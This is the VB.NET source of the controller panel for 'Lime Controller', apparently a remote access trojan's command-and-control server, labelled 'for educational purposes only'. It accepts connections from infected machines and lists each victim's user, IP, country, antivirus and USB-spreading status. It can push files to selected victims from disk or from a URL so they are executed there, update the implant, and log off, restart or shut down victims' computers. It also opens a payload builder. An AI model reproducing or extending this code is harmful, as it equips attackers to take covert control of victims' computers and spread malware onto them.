
'##################################################################
'##           N Y A N   C A T  ||  Last edit FEB/18/2018         ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                  .. Lime Controller v2.1 ..                  ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##                 For educational purposes only                ##
'##################################################################



Public Class Form1
    Private lvwColumnSorter As ListViewColumnSorter
    Public WithEvents S As Socket
    Public RKEY As String = "|L|"
    Public Myport As String = InputBox(" Hello " & Environment.UserName + vbNewLine + vbNewLine & " Please enter port", "PORT")


#Region "Events"

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Control.CheckForIllegalCrossThreadCalls = False
            S = New Socket
            S.Start(Myport)
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try

        NotifyIcon1.Icon = Me.Icon

    End Sub

    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        Try
            L1.Items(sock.ToString).Remove()
        Catch ex As Exception
        End Try
    End Sub

    Sub Connected(ByVal sock As Integer) Handles S.Connected
        S.Send(sock, "info") 'Tell me your info
    End Sub

    Private Sub Form1_Closing(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
        On Error Resume Next
        NotifyIcon1.Dispose()
        End
    End Sub

#End Region

#Region "receiving"
  
  Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())   
   Sub CMD(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim DATA As String() = Split(BS(B), RKEY)
        Try
            Select Case DATA(0)
                Case "info" ' he told me his info

                    Dim L = L1.Items.Add(sock.ToString, DATA(1), "")
                    For i As Integer = 1 To DATA.Length - 1
                        L.SubItems.Add(DATA(i))
                        L.SubItems(c_ip.Index).Text = (S.IP(sock))

                    Next

                    For i = 0 To L1.Items.Count - 1
                        If L1.Items(i).SubItems(9).Text = "Yes" Then
                            L1.Items(i).ForeColor = Color.Red
                        End If
                    Next

                    L.ToolTipText = sock
                    Fix()

                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
                    NotifyIcon1.BalloonTipTitle = "Lime Controller"
                    NotifyIcon1.BalloonTipText = "[New Client]" & vbNewLine & "Name : " & DATA(2) & vbNewLine & "IP : " & S.IP(sock) & vbNewLine & "Country : " & DATA(4) & ""
                    NotifyIcon1.ShowBalloonTip(1)


                    'Simple example
                Case "details"
                    'Edit form
                    Dim D As New Details
                    D.Text = DATA(1)
                    D.AutoScroll = False
                    D.Dock = DockStyle.Fill
                    D.ListView1.View = View.Details

                    'Use long way , or "For i As Integer = 1 To DATA.Length - 1"
                    D.ListView1.Items.Add("ID").SubItems.Add(DATA(1))
                    D.ListView1.Items.Add("User").SubItems.Add(DATA(2))
                    D.ListView1.Items.Add("Stub").SubItems.Add(DATA(3))
                    D.ListView1.Items.Add("Country").SubItems.Add(DATA(4))
                    D.ListView1.Items.Add("OS").SubItems.Add(DATA(5))
                    D.ListView1.Items.Add("Version").SubItems.Add(DATA(6))
                    D.ListView1.Items.Add("Installed").SubItems.Add(DATA(7))
                    D.ListView1.Items.Add("AV").SubItems.Add(DATA(8))
                    D.ListView1.Items.Add("USB Spread").SubItems.Add(DATA(9))

                    'fix
                    D.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

					If My.Application.OpenForms("details" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf CMD)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    D.sock = sock
                    D.Name = "details" & sock 'object name
                    D.Show()



            End Select
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Sending"

    Private Sub XxxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles XxxToolStripMenuItem.Click
        Try
            For Each Client As ListViewItem In L1.SelectedItems
                S.Send(Client.ToolTipText, "details")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromDiskToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromDiskToolStripMenuItem1.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = "All Type (*.*)|*.*"
                .Title = "Select a File"
            End With
            o.ShowDialog()

            Dim n As New IO.FileInfo(o.FileName)
            If o.FileName.Length > 0 Then
                For Each Client As ListViewItem In L1.SelectedItems
                    S.Send(Client.ToolTipText, "RunDisk" & RKEY & n.Name & RKEY & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub


    Private Sub FromURLToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then
                Exit Sub
            Else
                For Each Client As ListViewItem In L1.SelectedItems
                    S.Send(Client.ToolTipText, "RunURL" & RKEY & URL)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim MyFile As New OpenFileDialog
            With MyFile
                .Filter = "(*.exe)|*.exe"
                .Title = "UPDATE"
            End With
            MyFile.ShowDialog()
            Dim n As New IO.FileInfo(MyFile.FileName)
            If MyFile.FileName.Length > 0 Then
                For Each Client As ListViewItem In L1.SelectedItems
                    S.Send(Client.ToolTipText, "UpdateDisk" & RKEY & n.Name & RKEY & Convert.ToBase64String(IO.File.ReadAllBytes(MyFile.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Try
            Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
            If String.IsNullOrEmpty(URL) Then

                Exit Sub
            Else
                For Each Client As ListViewItem In L1.SelectedItems
                    S.Send(Client.ToolTipText, "UpdateURL" & RKEY & URL)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        Try
            For Each Client As ListViewItem In L1.SelectedItems
                S.Send(Client.ToolTipText, "Reconnect")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub UninstallToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem1.Click
        Try
            Dim result As Integer = MessageBox.Show("Are you sure you want to uninstall?", "Uninstall", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
            If result = DialogResult.Yes Then
                For Each Client As ListViewItem In L1.SelectedItems
                    S.Send(Client.ToolTipText, "Uni")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            For Each Client As ListViewItem In L1.SelectedItems
                S.Send(Client.ToolTipText, "Close")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        Try
            For Each Client As ListViewItem In L1.SelectedItems
                S.Send(Client.ToolTipText, "Logoff")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        Try
            For Each Client As ListViewItem In L1.SelectedItems
                S.Send(Client.ToolTipText, "Restart")
            Next
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        Try
            For Each Client As ListViewItem In L1.SelectedItems
                S.Send(Client.ToolTipText, "Shutdown")
            Next
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Theme"
    Private Sub ListView1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
        Using br = New SolidBrush(Color.FromArgb(20, 20, 20))
            e.DrawBackground()
            e.Graphics.FillRectangle(br, e.Bounds)
            Dim headerFont As New Font("Microsoft Sans Serif", 8, FontStyle.Bold)
            e.Graphics.DrawString(e.Header.Text, headerFont, Brushes.Lime, e.Bounds)
        End Using
    End Sub

    Private Sub ListView1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
        e.DrawDefault = True
        If (e.ItemIndex Mod 2) = 1 Then
            e.Item.BackColor = Color.FromArgb(20, 20, 20)
            e.Item.UseItemStyleForSubItems = True
        End If
    End Sub

    Private Sub Fix()
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub ListView1_Resize(sender As Object, e As EventArgs) Handles L1.Resize
        Fix()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.ToolStripStatusLabel1.Text = "Port [ pp ] Online[ oo ] Select[ ss ]".Replace("oo", L1.Items.Count).Replace("pp", Myport).Replace("ss", L1.SelectedItems.Count)
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        Opacity = 1
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Opacity = 0.8
    End Sub


#End Region

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("Coded by : NYAN CAT")
    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        Builder.ShowDialog()
    End Sub

End Class
